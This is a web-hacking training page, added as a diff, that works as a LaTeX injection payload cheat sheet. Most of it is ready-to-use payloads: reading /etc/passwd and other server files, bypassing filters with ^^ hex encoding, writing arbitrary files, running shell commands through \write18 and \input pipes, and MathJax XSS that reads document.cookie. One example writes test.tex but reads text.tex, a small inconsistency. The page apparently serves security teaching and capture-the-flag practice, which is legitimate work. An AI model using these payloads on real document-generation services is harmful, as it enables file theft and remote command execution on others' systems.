@@ -1,0 +1,108 @@
+---
+layout: training-page
+title: "LaTeX Injection — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - latex-injection
+  - rce
+  - file-read
+  - server-side-injection
+page_key: "web-latex-injection"
+---
+<h1>LaTeX Injection</h1>
+<p>LaTeX Injection occurs when untrusted user input is embedded into a LaTeX document that is then compiled by a LaTeX processor (such as pdflatex or xelatex). Because LaTeX is a full scripting language with access to the filesystem and shell, attackers can read arbitrary files, write files, execute commands, and in some cases trigger cross-site scripting in generated output.</p>
+
+<h2>File Read</h2>
+
+<h3>Read and Interpret File as LaTeX</h3>
+<p>The <code>\input</code> and <code>\include</code> commands load and interpret the target file as LaTeX source. This works for text files but will cause errors if the file contains characters with special LaTeX meaning:</p>
+<pre><code>\input{/etc/passwd}
+\include{somefile}  % loads somefile.tex</code></pre>
+
+<h3>Read a Single Line</h3>
+<pre><code>\newread\file
+\openin\file=/etc/issue
+\read\file to\line
+\text{\line}
+\closein\file</code></pre>
+
+<h3>Read Multiple Lines</h3>
+<pre><code>\lstinputlisting{/etc/passwd}
+\newread\file
+\openin\file=/etc/passwd
+\loop\unless\ifeof\file
+    \read\file to\fileline
+    \text{\fileline}
+\repeat
+\closein\file</code></pre>
+
+<h3>Read Without Interpreting (Verbatim)</h3>
+<p>Pastes raw file content without processing LaTeX commands inside it. Useful for files containing special characters:</p>
+<pre><code>\usepackage{verbatim}
+\verbatiminput{/etc/passwd}</code></pre>
+
+<h3>Handle Special Characters in Target Files</h3>
+<p>If the injection point is past the document header (so <code>\usepackage</code> cannot be used), deactivate special characters with <code>\catcode</code> to allow <code>\input</code> on files containing <code>$</code>, <code>#</code>, <code>_</code>, <code>&amp;</code> (e.g., Perl scripts):</p>
+<pre><code>\catcode `\$=12
+\catcode `\#=12
+\catcode `\_=12
+\catcode `\&amp;=12
+\input{path_to_script.pl}</code></pre>
+
+<h3>Blacklist Bypass — Unicode Hex Encoding</h3>
+<p>Replace characters with their Unicode hex equivalents to bypass blacklist filters. The <code>^^</code> prefix followed by two hex digits represents a character:</p>
+<ul>
+  <li><code>^^41</code> = capital A (U+0041)</li>
+  <li><code>^^7e</code> = tilde ~ (note: lowercase <code>e</code> required)</li>
+</ul>
+<pre><code>\lstin^^70utlisting{/etc/passwd}
+% ^^70 = 'p', so this becomes \lstinputlisting{/etc/passwd}</code></pre>
+
+<h2>File Write</h2>
+<p>Write arbitrary content to files on the server using <code>\newwrite</code> and <code>\openout</code>:</p>
+<pre><code>\newwrite\outfile
+\openout\outfile=cmd.tex
+\write\outfile{Hello-world}
+\write\outfile{Line 2}
+\write\outfile{I like trains}
+\closeout\outfile</code></pre>
+
+<h2>Command Execution</h2>
+<p>The <code>\write18</code> (shell escape) directive executes system commands. The output goes to stdout and is not automatically captured — redirect it to a temporary file then include that file in the document:</p>
+<pre><code>\immediate\write18{id &gt; output}
+\input{output}</code></pre>
+
+<p>Use base64 encoding to avoid characters that break LaTeX parsing in the output:</p>
+<pre><code>\immediate\write18{env | base64 &gt; test.tex}
+\input{text.tex}</code></pre>
+
+<p>Alternative pipe syntax for command execution:</p>
+<pre><code>\input|ls|base64
+\input{|"/bin/hostname"}</code></pre>
+
+<h2>Cross-Site Scripting via LaTeX</h2>
+<p>When LaTeX output is rendered in a browser (e.g., via MathJax or a web-based LaTeX renderer), some commands produce clickable links that execute JavaScript:</p>
+<pre><code>\url{javascript:alert(1)}
+\href{javascript:alert(1)}{placeholder}</code></pre>
+
+<p>In MathJax specifically, the <code>\unicode</code> extension allows injecting arbitrary HTML:</p>
+<pre><code>\unicode{&lt;img src=1 onerror="alert(document.cookie)"&gt;}</code></pre>
+
+<h2>Detection Context</h2>
+<p>Look for LaTeX injection opportunities in:</p>
+<ul>
+  <li>PDF generation endpoints (reports, invoices, certificates)</li>
+  <li>Math rendering on educational platforms</li>
+  <li>Scientific paper submission systems</li>
+  <li>Any input field that feeds into a LaTeX document template</li>
+</ul>
+<p>Test with benign payloads first: <code>\textbf{test}</code> appearing as bold text in the output confirms LaTeX is being processed.</p>
+
+<h2>Resources</h2>
+<ul>
+  <li>Root Me — LaTeX Input challenge — <code>root-me.org/en/Challenges/App-Script/LaTeX-Input</code></li>
+  <li>Root Me — LaTeX Command Execution challenge — <code>root-me.org/en/Challenges/App-Script/LaTeX-Command-execution</code></li>
+  <li>Hacking with LaTeX — Sebastian Neef — 0day.work</li>
+  <li>LaTeX to RCE, Private Bug Bounty Program — Yasho</li>
+  <li>Pwning coworkers thanks to LaTeX — scumjr</li>
+</ul>
